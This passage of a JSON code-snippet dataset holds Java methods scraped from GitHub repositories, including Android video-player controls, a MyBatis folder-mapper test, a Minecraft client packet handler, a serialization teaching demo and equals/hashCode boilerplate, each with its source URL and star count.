{\n        if (!mHadPlay) {\n            return;\n        }\n        if (mType == 1) {\n            mMoreScale.setText(\"16:9\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_16_9);\n        } else if (mType == 2) {\n            mMoreScale.setText(\"4:3\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_4_3);\n        } else if (mType == 3) {\n            mMoreScale.setText(\"\u5168\u5c4f\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_FULL);\n        } else if (mType == 4) {\n            mMoreScale.setText(\"\u62c9\u4f38\u5168\u5c4f\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_MATCH_FULL);\n        } else if (mType == 0) {\n            mMoreScale.setText(\"\u9ed8\u8ba4\u6bd4\u4f8b\");\n            GSYVideoType.setShowType(GSYVideoType.SCREEN_TYPE_DEFAULT);\n        }\n        changeTextureViewShowType();\n        if (mTextureView != null)\n            mTextureView.requestLayout();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34990, "method_name": "onTouch", "class_name": "SmallVideoTouch", "params": ["View", "MotionEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onTouch(View view, MotionEvent event) {\n        final int X = (int) event.getRawX();\n        final int Y = (int) event.getRawY();\n        switch (event.getAction() & MotionEvent.ACTION_MASK) {\n            case MotionEvent.ACTION_DOWN:\n                mDownX = X;\n                mDownY = Y;\n\n                FrameLayout.LayoutParams lParams = (FrameLayout.LayoutParams) mGsyBaseVideoPlayer\n                        .getLayoutParams();\n                _xDelta = X - lParams.leftMargin;\n                _yDelta = Y - lParams.topMargin;\n\n                break;\n            case MotionEvent.ACTION_UP:\n                if (Math.abs(mDownY - Y) < 5 && Math.abs(mDownX - X) < 5) {\n                    return false;\n                } else {\n                    return true;\n                }\n            case MotionEvent.ACTION_MOVE:\n                FrameLayout.LayoutParams layoutParams = (FrameLayout.LayoutParams) mGsyBaseVideoPlayer\n                        .getLayoutParams();\n\n                layoutParams.leftMargin = X - _xDelta;\n                layoutParams.topMargin = Y - _yDelta;\n\n                if (layoutParams.leftMargin >= mMarginLeft) {\n                    layoutParams.leftMargin = mMarginLeft;\n                }\n\n                if (layoutParams.topMargin >= mMarginTop) {\n                    layoutParams.topMargin = mMarginTop;\n                }\n\n                if (layoutParams.leftMargin <= 0) {\n                    layoutParams.leftMargin = 0;\n                }\n\n                if (layoutParams.topMargin <= 0) {\n                    layoutParams.topMargin = 0;\n                }\n\n                mGsyBaseVideoPlayer.setLayoutParams(layoutParams);\n\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/view/SmallVideoTouch.java", "stars": "2", "class_props": {"extends": null, "implements": ["View"], "modifiers": ["public"]}}, {"id": 34991, "method_name": "testFindWithChildren", "class_name": "FolderMapperTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testFindWithChildren() throws Exception {\n    try (Connection conn = DriverManager.getConnection(\"jdbc:hsqldb:mem:association_nested\", \"SA\", \"\");\n         Statement stmt = conn.createStatement()) {\n      stmt.execute(\"create table folder (id int, name varchar(100), parent_id int)\");\n      stmt.execute(\"insert into folder (id, name) values(1, 'Root')\");\n      stmt.execute(\"insert into folder values(2, 'Folder 1', 1)\");\n      stmt.execute(\"insert into folder values(3, 'Folder 2', 1)\");\n      stmt.execute(\"insert into folder values(4, 'Folder 2_1', 3)\");\n      stmt.execute(\"insert into folder values(5, 'Folder 2_2', 3)\");\n    }\n\n    /**\n     * Root/\n     *    Folder 1/\n     *    Folder 2/\n     *      Folder 2_1\n     *      Folder 2_2\n     */\n\n    String resource = \"org/apache/ibatis/submitted/association_nested/mybatis-config.xml\";\n    try (InputStream inputStream = Resources.getResourceAsStream(resource)) {\n      SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);\n      try (SqlSession session = sqlSessionFactory.openSession()) {\n        FolderMapper postMapper = session.getMapper(FolderMapper.class);\n\n        List<FolderFlatTree> folders = postMapper.findWithSubFolders(\"Root\");\n\n        Assertions.assertEquals(3, folders.size());\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/association_nested/FolderMapperTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34992, "method_name": "onPacket", "class_name": "Handshake", "params": ["PacketEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPacket(PacketEvent event) {\n        if (event.getType().equals(PacketEvent.Type.OUTGOING)) {\n            if (event.getPacket() instanceof FMLProxyPacket && !mc.isSingleplayer()) {\n                event.setCancelled(true);\n            }\n            if (event.getPacket() instanceof CPacketCustomPayload) {\n                final CPacketCustomPayload packet = (CPacketCustomPayload) event.getPacket();\n                if (packet.getChannelName().equals(\"MC|Brand\")) {\n                    packet.data = new PacketBuffer(Unpooled.buffer()).writeString(brand);\n                }\n            }\n            /*if (event.getPacket() instanceof FMLHandshakeMessage.ModList) {\n                FMLHandshakeMessage.ModList packet = (FMLHandshakeMessage.ModList) event.getPacket();\n            }*/\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/misc/Handshake.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 34993, "method_name": "main", "class_name": "Demo03Test", "params": ["String"], "throws": ["IOException", "ClassNotFoundException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        //1.\u5b9a\u4e49\u4e00\u4e2a\u5b58\u50a8Person\u5bf9\u8c61\u7684ArrayList\u96c6\u5408\n        ArrayList<Person> list = new ArrayList<>();\n        //2.\u5f80ArrayList\u96c6\u5408\u4e2d\u5b58\u50a8Person\u5bf9\u8c61\n        list.add(new Person(\"\u5f20\u4e09\",18));\n        list.add(new Person(\"\u674e\u56db\",19));\n        list.add(new Person(\"\u738b\u4e94\",20));\n        //3.\u521b\u5efa\u4e00\u4e2a\u5e8f\u5217\u5316\u6d41ObjectOutputStream\u5bf9\u8c61\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"10_IO\\\\list.txt\"));\n        //4.\u4f7f\u7528ObjectOutputStream\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5writeObject,\u5bf9\u96c6\u5408\u8fdb\u884c\u5e8f\u5217\u5316\n        oos.writeObject(list);\n        //5.\u521b\u5efa\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316ObjectInputStream\u5bf9\u8c61\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"10_IO\\\\list.txt\"));\n        //6.\u4f7f\u7528ObjectInputStream\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5readObject\u8bfb\u53d6\u6587\u4ef6\u4e2d\u4fdd\u5b58\u7684\u96c6\u5408\n        Object o = ois.readObject();\n        //7.\u628aObject\u7c7b\u578b\u7684\u96c6\u5408\u8f6c\u6362\u4e3aArrayList\u7c7b\u578b\n        ArrayList<Person> list2 = (ArrayList<Person>)o;\n        //8.\u904d\u5386ArrayList\u96c6\u5408\n        for (Person p : list2) {\n            System.out.println(p);\n        }\n        //9.\u91ca\u653e\u8d44\u6e90\n        ois.close();\n        oos.close();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/21.%E3%80%90%E7%BC%93%E5%86%B2%E6%B5%81%E3%80%81%E8%BD%AC%E6%8D%A2%E6%B5%81%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E3%80%81%E6%89%93%E5%8D%B0%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/10_IO/src/com/itheima/demo04/ObjectStream/Demo03Test.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34994, "method_name": "clone", "class_name": "IgnoreRuleSentencePair", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object clone() {\n    return new IgnoreRuleSentencePair(ruleId, sentenceString);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/IgnoreRuleSentencePair.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34995, "method_name": "equals", "class_name": "IgnoreRuleSentencePair", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean equals(Object obj) {\n    if ((obj == null) || !IgnoreRuleSentencePair.class.isAssignableFrom(obj.getClass())) {\n      return false;\n    }\n\n    IgnoreRuleSentencePair other = (IgnoreRuleSentencePair)obj;\n\n    if ((ruleId == null) ? (other.ruleId != null) : !ruleId.equals(other.ruleId)) {\n      return false;\n    }\n\n    if ((sentenceString == null) ? (other.sentenceString != null) :\n          !sentenceString.equals(other.sentenceString)) {\n      return false;\n    }\n\n    return true;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/IgnoreRuleSentencePair.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34996, "method_name": "hashCode", "class_name": "IgnoreRuleSentencePair", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int hashCode() {\n    int hash = 3;\n\n    hash = 53 * hash + ((ruleId != null) ? ruleId.hashCode() : 0);\n    hash = 53 * hash + ((sentenceString != null) ? sentenceString.hashCode() : 0);\n\n    return hash;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/IgnoreRuleSentencePair.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34997, "method_name": "getRuleId", "class_name": "IgnoreRuleSentencePair", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRuleId() { return ruleId; }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/IgnoreRuleSentencePair.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34998, "method_name": "getSentenceString", "class_name": "IgnoreRuleSentencePair", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSentenceString() { return sentenceString; }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/IgnoreRuleSentencePair.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}]